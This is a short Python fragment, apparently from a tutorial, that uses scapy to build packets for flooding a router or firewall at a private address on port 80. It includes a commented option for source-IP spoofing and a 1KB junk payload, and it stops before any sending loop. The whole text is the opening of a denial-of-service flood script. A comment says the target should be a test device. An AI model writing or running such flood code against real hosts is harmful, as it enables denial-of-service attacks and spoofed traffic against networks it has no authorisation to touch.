# pip3 install scapy
from scapy.all import *

# target IP address (should be a testing router/firewall)
target_ip = "192.168.1.1"
# the target port u want to flood
target_port = 80

# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)
